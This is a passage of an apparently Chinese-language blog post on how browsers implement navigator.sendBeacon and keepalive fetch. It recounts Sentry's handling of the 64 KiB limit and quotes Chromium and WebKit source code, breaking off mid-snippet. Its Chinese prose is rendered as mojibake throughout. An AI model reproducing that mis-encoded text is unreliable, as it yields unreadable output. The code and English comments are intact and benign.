href="https://github.com/getsentry/sentry-javascript/pull/1496">ref: Remove keepalive:true as a default and document payload size #1496</a></p><p>å…©å¹´å¾Œçš„ 2020 å¹´ï¼Œæœ‰äººç™¼ç¾äº† keepalive çš„è¦æ ¼ä»¥åŠæ­£ç¢ºç”¨æ³•ï¼š<a href="https://github.com/getsentry/sentry-javascript/issues/2547">Fetch KeepAlive #2547</a>ï¼Œæè­°åœ¨ payload è¨±å¯ä¹‹ä¸‹ç”¨ keepaliveï¼Œè¶…éæ‰ä¸ç”¨ï¼Œè€Œä¸æ˜¯åƒç•¶æ™‚å…¨éƒ¨éƒ½ä¸ç”¨ã€‚</p><p>ä½†ç•¶æ™‚ä¸¦æ²’æœ‰ä»»ä½•å‹•ä½œï¼Œæ˜¯åˆéäº†å…©å¹´ï¼Œåœ¨ 2022 å¹´æ™‚ï¼Œæœ‰äººç™¼ç¾ Chrome åœ¨ navigation çš„æ™‚å€™æœƒå–æ¶ˆæ‰€æœ‰è«‹æ±‚ï¼Œå› æ­¤æœ‰äº›è«‹æ±‚é€ä¸å‡ºå»ï¼Œæ‰æƒ³åˆ°è¦åˆ©ç”¨ keepalive ä¾†è§£æ±ºã€‚</p><p>å› æ­¤åœ¨ 2022 å¹´ 9 æœˆæ™‚ï¼Œæ‰åˆæŠŠå®ƒåŠ äº†å›å»ï¼Œä¸¦ä¸”ç•™ä¸‹ç²¾é—¢çš„è¨»è§£ï¼š</p><p><a href="https://github.com/getsentry/sentry-javascript/issues/2547">feat(browser): Use fetch keepalive flag #5697</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Outgoing requests are usually cancelled when navigating to a different page, causing a "TypeError: Failed to</span><span class="token comment">// fetch" error and sending a "network_error" client-outcome - in Chrome, the request status shows "(cancelled)".</span><span class="token comment">// The `keepalive` flag keeps outgoing requests alive, even when switching pages. We want this since we're</span><span class="token comment">// frequently sending events right before the user is switching pages (eg. whenfinishing navigation transactions).</span><span class="token comment">// Gotchas:</span><span class="token comment">// - `keepalive` isn't supported by Firefox</span><span class="token comment">// - As per spec (https://fetch.spec.whatwg.org/#http-network-or-cache-fetch), a request with `keepalive: true`</span><span class="token comment">//   and a content length of > 64 kibibytes returns a network error. We will therefore only activate the flag when</span><span class="token comment">//   we're below that limit.</span><span class="token literal-property property">keepalive</span><span class="token operator">:</span> request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">65536</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸­æ–‡æ©Ÿç¿»ï¼š</p><blockquote><p>ç•¶åˆ‡æ›åˆ°ä¸åŒé é¢æ™‚ï¼Œæœªå®Œæˆçš„è«‹æ±‚é€šå¸¸æœƒè¢«å–æ¶ˆï¼Œé€²è€Œå°è‡´ã€ŒTypeError: Failed to fetchã€éŒ¯èª¤ï¼Œä¸¦å‡ºç¾ã€Œnetwork_errorã€ã€‚åœ¨ Chrome ä¸­ï¼Œè«‹æ±‚ç‹€æ…‹æœƒé¡¯ç¤ºã€Œ(cancelled)ã€ã€‚<br>keepalive æ¨™èªŒå¯ä»¥è®“æœªå®Œæˆçš„è«‹æ±‚åœ¨é é¢åˆ‡æ›æ™‚ç¹¼çºŒä¿æŒæ´»å‹•ç‹€æ…‹ã€‚ç”±æ–¼æˆ‘å€‘ç¶“å¸¸åœ¨ä½¿ç”¨è€…åˆ‡æ›é é¢å‰å‚³é€äº‹ä»¶ï¼Œå› æ­¤éœ€è¦é€™å€‹åŠŸèƒ½ã€‚</p><p>éœ€è¦æ³¨æ„ï¼š</p><ol><li>Firefox ä¸æ”¯æ´ keepaliveã€‚</li><li>æ ¹æ“šè¦ç¯„ï¼Œå¦‚æœè«‹æ±‚è¨­å®šäº† keepalive: true ä¸¦ä¸”å…§å®¹é•·åº¦è¶…é 64 KiBï¼Œå°‡æœƒè¿”å›ç¶²è·¯éŒ¯èª¤ã€‚å› æ­¤ï¼Œæˆ‘å€‘åªæœƒåœ¨è«‹æ±‚å…§å®¹é•·åº¦ä½æ–¼è©²é™åˆ¶æ™‚å•Ÿç”¨æ­¤æ¨™èªŒã€‚</li></ol></blockquote><p>ä½†æ•…äº‹é‚„æ²’å®Œï¼Œå°±åƒæˆ‘å‰›æ‰æåˆ°çš„ï¼Œé€™å€‹ 65536 çš„é™åˆ¶ä¸¦ä¸åªæ˜¯å–®å€‹è«‹æ±‚ï¼Œè€Œæ˜¯æœ‰å€‹ queueï¼Œå› æ­¤é€™æ¨£åšæ˜¯ä¸å¤ çš„ã€‚åŠå¹´ä¹‹å¾Œï¼ŒSentry ä¹Ÿæ³¨æ„åˆ°äº†é€™å€‹å•é¡Œï¼ŒåŠ ä¸Šäº†è¨ˆç®— queue size çš„é‚è¼¯ï¼Œè®“æ•´å€‹æ©Ÿåˆ¶è®Šå¾—æ›´åŠ ç©©å¥ï¼š<a href="https://github.com/getsentry/sentry-javascript/pull/7553">fix(browser): Ensure keepalive flag is correctly set for parallel requests #7553</a></p><p><img src="/img/navigator-sendbeacon-64kib-and-source-code/p6.png" alt="Issue æˆªåœ–"></p><p>å¦‚æœä¹‹å¾Œæœ‰æƒ³è¦å¯¦ä½œé¡ä¼¼çš„æ±è¥¿ï¼Œå¯ä»¥ç›´æ¥åƒè€ƒä¸Šé¢ Sentry çš„ PRã€‚</p><h2><span id="sendbeacon-çš„å¯¦ä½œ">sendBeacon çš„å¯¦ä½œ</span></h2><h3><span id="chromium-çš„-sendbeacon-å¯¦ä½œ">Chromium çš„ sendBeacon å¯¦ä½œ</span></h3><p>æœ€å¾Œæˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹ sendBeacon åº•å±¤çš„å¯¦ä½œï¼Œå…ˆå¾ Chromium é–‹å§‹ï¼Œæˆ‘ä»¥å¯«æ–‡ç« æ™‚æœ€æ–°çš„ç©©å®šç‰ˆ 131.0.6778.205 ç‚ºä¾‹ï¼Œç›¸é—œç¨‹å¼ç¢¼åœ¨ï¼š<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/131.0.6778.205:third_party/blink/renderer/modules/beacon/navigator_beacon.cc;l=93">third_party&#x2F;blink&#x2F;renderer&#x2F;modules&#x2F;beacon&#x2F;navigator_beacon.cc</a></p><p>æˆ‘æ“·å–å…¶ä¸­ä¸€å°æ®µæ ¸å¿ƒç¨‹å¼ç¢¼ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">bool NavigatorBeacon<span class="token operator">::</span><span class="token function">SendBeaconImpl</span><span class="token punctuation">(</span>    ScriptState<span class="token operator">*</span> script_state<span class="token punctuation">,</span>    <span class="token keyword">const</span> String<span class="token operator">&amp;</span> url_string<span class="token punctuation">,</span>    <span class="token keyword">const</span> V8UnionReadableStreamOrXMLHttpRequestBodyInit<span class="token operator">*</span> data<span class="token punctuation">,</span>    ExceptionState<span class="token operator">&amp;</span> exception_state<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  ExecutionContext<span class="token operator">*</span> execution_context <span class="token operator">=</span> ExecutionContext<span class="token operator">::</span><span class="token function">From</span><span class="token punctuation">(</span>script_state<span class="token punctuation">)</span><span class="token punctuation">;</span>  KURL url <span class="token operator">=</span> execution_context<span class="token operator">-></span><span class="token function">CompleteURL</span><span class="token punctuation">(</span>url_string<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">CanSendBeacon</span><span class="token punctuation">(</span>execution_context<span class="token punctuation">,</span> url<span class="token punctuation">,</span> exception_state<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> false<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  bool allowed<span class="token punctuation">;</span>  LocalFrame<span class="token operator">*</span> frame <span class="token operator">=</span> <span class="token function">GetSupplementable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">DomWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>data<span class="token operator">-></span><span class="token function">GetContentType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// [...]</span>      <span class="token keyword">case</span> V8UnionReadableStreamOrXMLHttpRequestBodyInit<span class="token operator">::</span>ContentType<span class="token operator">::</span>          kUSVString<span class="token operator">:</span>        UseCounter<span class="token operator">::</span><span class="token function">Count</span><span class="token punctuation">(</span>execution_context<span class="token punctuation">,</span>                          WebFeature<span class="token operator">::</span>kSendBeaconWithUSVString<span class="token punctuation">)</span><span class="token punctuation">;</span>        allowed <span class="token operator">=</span> PingLoader<span class="token operator">::</span><span class="token function">SendBeacon</span><span class="token punctuation">(</span><span class="token operator">*</span>script_state<span class="token punctuation">,</span> frame<span class="token punctuation">,</span> url<span class="token punctuation">,</span>                                         data<span class="token operator">-></span><span class="token function">GetAsUSVString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    allowed <span class="token operator">=</span> PingLoader<span class="token operator">::</span><span class="token function">SendBeacon</span><span class="token punctuation">(</span><span class="token operator">*</span>script_state<span class="token punctuation">,</span> frame<span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowed<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    UseCounter<span class="token operator">::</span><span class="token function">Count</span><span class="token punctuation">(</span>execution_context<span class="token punctuation">,</span> WebFeature<span class="token operator">::</span>kSendBeaconQuotaExceeded<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> allowed<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é–‹é ­çš„ <code>CanSendBeacon</code> åŸºæœ¬ä¸Šå°±æ˜¯æª¢æŸ¥ URL æ˜¯å¦åˆæ³•è€Œå·²ï¼Œåˆæ³•çš„è©±ç¹¼çºŒå¾€ä¸‹èµ°ï¼Œæœƒåˆ¤æ–·è¦é€å‡ºçš„ payload çš„ content typeï¼Œè€Œå¯¦éš›é€å‡ºæ˜¯åœ¨ <code>PingLoader::SendBeacon</code> é€™å€‹æ–¹æ³•è£¡é¢ã€‚</p><p>é™¤æ­¤ä¹‹å¤–å¯ä»¥åœ¨ç¨‹å¼ç¢¼è£¡é¢çœ‹åˆ° <code>UseCounter::Count</code>ï¼Œé€™å€‹æ˜¯ Chromium ç”¨ä¾†è¿½è¹¤æŸäº›åŠŸèƒ½çš„ä½¿ç”¨é »ç‡æ™‚æœƒç”¨åˆ°çš„ã€‚</p><p><code>PingLoader::SendBeacon</code> çš„å¯¦ä½œåœ¨ <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/131.0.6778.205:third_party/blink/renderer/core/loader/ping_loader.cc">third_party&#x2F;blink&#x2F;renderer&#x2F;core&#x2F;loader&#x2F;ping_loader.cc</a>ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">bool <span class="token function">SendBeaconCommon</span><span class="token punctuation">(</span><span class="token keyword">const</span> ScriptState<span class="token operator">&amp;</span> state<span class="token punctuation">,</span>                      LocalFrame<span class="token operator">*</span> frame<span class="token punctuation">,</span>                      <span class="token keyword">const</span> KURL<span class="token operator">&amp;</span> url<span class="token punctuation">,</span>                      <span class="token keyword">const</span> BeaconData<span class="token operator">&amp;</span> beacon<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>frame<span class="token operator">-></span><span class="token function">DomWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token operator">-></span><span class="token function">GetContentSecurityPolicyForWorld</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>state<span class="token punctuation">.</span><span class="token function">World</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token operator">-></span><span class="token function">AllowConnectToSource</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> url<span class="token punctuation">,</span> RedirectStatus<span class="token operator">::</span>kNoRedirect<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// We're simulating a network failure here, so we return 'true'.</span>    <span class="token keyword">return</span> true<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  ResourceRequest <span class="token function">request</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function">SetHttpMethod</span><span class="token punctuation">(</span>http_names<span class="token operator">::</span>kPOST<span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function">SetKeepalive</span><span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function">SetRequestContext</span><span class="token punctuation">(</span>mojom<span class="token operator">::</span>blink<span class="token operator">::</span>RequestContextType<span class="token operator">::</span>BEACON<span class="token punctuation">)</span><span class="token punctuation">;</span>  beacon<span class="token punctuation">.</span><span class="token function">Serialize</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>  FetchParameters <span class="token function">params</span><span class="token punctuation">(</span>std<span class="token operator">::</span><span class="token function">move</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span>                         <span class="token function">ResourceLoaderOptions</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>state<span class="token punctuation">.</span><span class="token function">World</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// The spec says:</span>  <span class="token comment">//  - If mimeType is not null:</span>  <span class="token comment">//   - If mimeType value is a CORS-safelisted request-header value for the</span>  <span class="token comment">//     Content-Type header, set corsMode to "no-cors".</span>  <span class="token comment">// As we don't support requests with non CORS-safelisted Content-Type, the</span>  <span class="token comment">// mode should always be "no-cors".</span>  params<span class="token punctuation">.</span><span class="token function">MutableOptions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>initiator_info<span class="token punctuation">.</span>name <span class="token operator">=</span>      fetch_initiator_type_names<span class="token operator">::</span>kBeacon<span class="token punctuation">;</span>  frame<span class="token operator">-></span><span class="token function">Client</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">DidDispatchPingLoader</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>  FetchUtils<span class="token operator">::</span><span class="token function">LogFetchKeepAliveRequestMetric</span><span class="token punctuation">(</span>      params<span class="token punctuation">.</span><span class="token function">GetResourceRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">GetRequestContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      FetchUtils<span class="token operator">::</span>FetchKeepAliveRequestState<span class="token operator">::</span>kTotal<span class="token punctuation">)</span><span class="token punctuation">;</span>  Resource<span class="token operator">*</span> resource <span class="token operator">=</span>      RawResource<span class="token operator">::</span><span class="token function">Fetch</span><span class="token punctuation">(</span>params<span class="token punctuation">,</span> frame<span class="token operator">-></span><span class="token function">DomWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">Fetcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> resource<span class="token operator">-></span><span class="token function">GetStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> ResourceStatus<span class="token operator">::</span>kLoadError<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é–‹é ­å…ˆæª¢æŸ¥æ˜¯å¦é•å CSPï¼Œå¦‚æœæ²’æœ‰é•åï¼Œå°±é€å‡ºä¸€å€‹ keepalive çš„è«‹æ±‚ï¼Œç„¶å¾Œå›å‚³æ˜¯å¦æˆåŠŸã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯åœ¨åŒå€‹æª”æ¡ˆä¸­ï¼Œä¹Ÿæœ‰å¦ä¸€å€‹åŠŸèƒ½åšäº†é¡ä¼¼çš„äº‹æƒ…ï¼Œå«åš <code>PingLoader::SendLinkAuditPing</code>ã€‚åœ¨ <code>&lt;a&gt;</code> æ¨™ç±¤ä¸Šæœ‰å€‹å±¬æ€§å«åš <code>ping</code>ï¼Œç•¶ä½¿ç”¨è€…é»äº†é€£çµï¼Œç€è¦½å™¨å°±æœƒç™¼é€ä¸€å€‹è«‹æ±‚åˆ° ping æ‰€æŒ‡å®šçš„ä½ç½®ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span>  <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://example.com<span class="token punctuation">"</span></span>  <span class="token attr-name">ping</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://blog.huli.tw<span class="token punctuation">"</span></span>  <span class="token punctuation">></span></span>click me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€™èƒŒå¾Œä¸€æ¨£æ˜¯ç”¨ keepalive çš„ fetch ä¾†å¯¦ä½œçš„ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> PingLoader<span class="token operator">::</span><span class="token function">SendLinkAuditPing</span><span class="token punctuation">(</span>LocalFrame<span class="token operator">*</span> frame<span class="token punctuation">,</span>                                   <span class="token keyword">const</span> KURL<span class="token operator">&amp;</span> ping_url<span class="token punctuation">,</span>                                   <span class="token keyword">const</span> KURL<span class="token operator">&amp;</span> destination_url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ping_url<span class="token punctuation">.</span><span class="token function">ProtocolIsInHTTPFamily</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  ResourceRequest <span class="token function">request</span><span class="token punctuation">(</span>ping_url<span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function">SetHttpMethod</span><span class="token punctuation">(</span>http_names<span class="token operator">::</span>kPOST<span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function">SetHTTPContentType</span><span class="token punctuation">(</span><span class="token function">AtomicString</span><span class="token punctuation">(</span><span class="token string">"text/ping"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function">SetHttpBody</span><span class="token punctuation">(</span>EncodedFormData<span class="token operator">::</span><span class="token function">Create</span><span class="token punctuation">(</span>base<span class="token operator">::</span><span class="token function">span_from_cstring</span><span class="token punctuation">(</span><span class="token string">"PING"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function">SetHttpHeaderField</span><span class="token punctuation">(</span>http_names<span class="token operator">::</span>kCacheControl<span class="token punctuation">,</span>                             <span class="token function">AtomicString</span><span class="token punctuation">(</span><span class="token string">"max-age=0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function">SetHttpHeaderField</span><span class="token punctuation">(</span>http_names<span class="token operator">::</span>kPingTo<span class="token punctuation">,</span>                             <span class="token function">AtomicString</span><span class="token punctuation">(</span>destination_url<span class="token punctuation">.</span><span class="token function">GetString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  scoped_refptr<span class="token operator">&lt;</span><span class="token keyword">const</span> SecurityOrigin<span class="token operator">></span> ping_origin <span class="token operator">=</span>      SecurityOrigin<span class="token operator">::</span><span class="token function">Create</span><span class="token punctuation">(</span>ping_url<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ProtocolIs</span><span class="token punctuation">(</span>frame<span class="token operator">-></span><span class="token function">DomWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">Url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">GetString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"http"</span><span class="token punctuation">)</span> <span class="token operator">||</span>      frame<span class="token operator">-></span><span class="token function">DomWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetSecurityOrigin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">CanAccess</span><span class="token punctuation">(</span>ping_origin<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    request<span class="token punctuation">.</span><span class="token function">SetHttpHeaderField</span><span class="token punctuation">(</span>        http_names<span class="token operator">::</span>kPingFrom<span class="token punctuation">,</span>        <span class="token function">AtomicString</span><span class="token punctuation">(</span>frame<span class="token operator">-></span><span class="token function">DomWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">Url</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">GetString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  request<span class="token punctuation">.</span><span class="token function">SetKeepalive</span><span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function">SetReferrerString</span><span class="token punctuation">(</span>Referrer<span class="token operator">::</span><span class="token function">NoReferrer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function">SetReferrerPolicy</span><span class="token punctuation">(</span>network<span class="token operator">::</span>mojom<span class="token operator">::</span>ReferrerPolicy<span class="token operator">::</span>kNever<span class="token punctuation">)</span><span class="token punctuation">;</span>  request<span class="token punctuation">.</span><span class="token function">SetRequestContext</span><span class="token punctuation">(</span>mojom<span class="token operator">::</span>blink<span class="token operator">::</span>RequestContextType<span class="token operator">::</span>PING<span class="token punctuation">)</span><span class="token punctuation">;</span>  FetchParameters <span class="token function">params</span><span class="token punctuation">(</span>      std<span class="token operator">::</span><span class="token function">move</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token function">ResourceLoaderOptions</span><span class="token punctuation">(</span>frame<span class="token operator">-></span><span class="token function">DomWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetCurrentWorld</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  params<span class="token punctuation">.</span><span class="token function">MutableOptions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>initiator_info<span class="token punctuation">.</span>name <span class="token operator">=</span>      fetch_initiator_type_names<span class="token operator">::</span>kPing<span class="token punctuation">;</span>  frame<span class="token operator">-></span><span class="token function">Client</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">DidDispatchPingLoader</span><span class="token punctuation">(</span>ping_url<span class="token punctuation">)</span><span class="token punctuation">;</span>  FetchUtils<span class="token operator">::</span><span class="token function">LogFetchKeepAliveRequestMetric</span><span class="token punctuation">(</span>      params<span class="token punctuation">.</span><span class="token function">GetResourceRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">GetRequestContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      FetchUtils<span class="token operator">::</span>FetchKeepAliveRequestState<span class="token operator">::</span>kTotal<span class="token punctuation">)</span><span class="token punctuation">;</span>  RawResource<span class="token operator">::</span><span class="token function">Fetch</span><span class="token punctuation">(</span>params<span class="token punctuation">,</span> frame<span class="token operator">-></span><span class="token function">DomWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">Fetcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="safari-çš„-sendbeacon-å¯¦ä½œ">Safari çš„ sendBeacon å¯¦ä½œ</span></h3><p>Safari çš„å¯¦ä½œåœ¨ <a href="https://github.com/WebKit/WebKit/blob/WebKit-7620.1.16.111.5/Source/WebCore/Modules/beacon/NavigatorBeacon.cpp">WebKit&#x2F;Source&#x2F;WebCore&#x2F;Modules&#x2F;beacon<br>&#x2F;NavigatorBeacon.cpp</a>ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">ExceptionOr<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">></span> <span class="token class-name">NavigatorBeacon</span><span class="token double-colon punctuation">::</span><span class="token function">sendBeacon</span><span class="token punctuation">(</span>Document<span class="token operator">&amp;</span> document<span class="token punctuation">,</span> <span class="token keyword">const</span> String<span class="token operator">&amp;</span> url<span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span>optional<span class="token operator">&lt;</span>FetchBody<span class="token double-colon punctuation">::</span>Init<span class="token operator">></span><span class="token operator">&amp;&amp;</span> body<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    URL parsedUrl <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">completeURL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Set parsedUrl to the result of the URL parser steps with url and base. If the algorithm returns an error, or if</span>    <span class="token comment">// parsedUrl's scheme is not "http" or "https", throw a "TypeError" exception and terminate these steps.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>parsedUrl<span class="token punctuation">.</span><span class="token function">isValid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> Exception <span class="token punctuation">&#123;</span> ExceptionCode<span class="token double-colon punctuation">::</span>TypeError<span class="token punctuation">,</span> <span class="token string">"This URL is invalid"</span>_s <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>parsedUrl<span class="token punctuation">.</span><span class="token function">protocolIsInHTTPFamily</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> Exception <span class="token punctuation">&#123;</span> ExceptionCode<span class="token double-colon punctuation">::</span>TypeError<span class="token punctuation">,</span> <span class="token string">"Beacons can only be sent over HTTP(S)"</span>_s <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>document<span class="token punctuation">.</span><span class="token function">frame</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>document<span class="token punctuation">.</span><span class="token function">shouldBypassMainWorldContentSecurityPolicy</span><span class="token 